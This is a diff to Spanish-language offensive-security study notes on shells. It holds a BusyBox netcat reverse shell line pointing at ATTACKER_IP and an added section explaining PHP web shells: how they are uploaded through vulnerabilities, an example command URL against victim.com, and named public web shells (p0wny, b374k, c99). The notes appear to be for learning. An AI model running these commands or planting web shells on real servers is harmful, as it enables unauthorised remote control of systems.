@@ -253,6 +253,39 @@ busybox nc ATTACKER_IP 443 -e sh
 
 Esta shell inversa de BusyBox utiliza Netcat (nc) para conectarse al atacante en ATTACKER_IP:443. Una vez conectado, ejecuta /bin/sh, exponiendo la línea de comandos al atacante.
 
-
 ## Web Shell
+
+Un Web Shell es un script escrito en un lenguaje compatible con un servidor web comprometido que ejecuta comandos a través del propio servidor. Generalmente, un web shell es un archivo que contiene el código para ejecutar comandos y gestionar archivos.
+
+Puede estar oculto dentro de una aplicación o servicio web comprometido, lo que dificulta su detección y lo convierte en una herramienta muy popular entre los atacantes.
+
+Los web shells pueden escribirse en varios lenguajes compatibles con servidores web, como PHP, ASP, JSP e incluso scripts CGI sencillos.
+
+### Ejemplo de Web Shell PHP
+
+
+
+Este shell puede ser guardado en un archivo con extensión PHP, como shell.php, y luego ser subido a un servidor web por un atacante explotando vulnerabilidades como Unrestricted File Upload, File Inclusion, Command Injection, entre otros, o al ganar acceso no autorizado a el.
+
+![[Pasted image 20260414001552.png]]
+
+Después de que el web shell es desplegado, puede ser accesible a través de la url en la que el web shell está hosteado, en este caso `http://victim.com/uploads/shell.php`. Como observamos en el código de shell.php, necesitamos tener un método GET y el valor de la variable `cmd`, el cual debería contener el comando que el atacante quiere ejecutar. Por ejemplo, si quisieramos ejecutar el comando whoami en la URL sería:
+
+`http://victim.com/uploads/shell.php?cmd=whoami`
+
+Lo anterior va a ejecutar el comando whoami y mostrará el resultado en el buscador web.
+
+### Web Shells Existentes Disponibles en Línea
+
+#### p0wny-shell
+
+Un web shell PHP de un solo archivo minimalista que permite ejecución de comandos de forma remota.
+
+#### b374k shell
+
+Una web shell más rica en características con manejo de archivos y ejecución de comandos, entre otras funcionalidades.
+
+#### c99 shell
+
+Una web shell PHP muy conocida y robusta con funcionalidad extensiva.
 
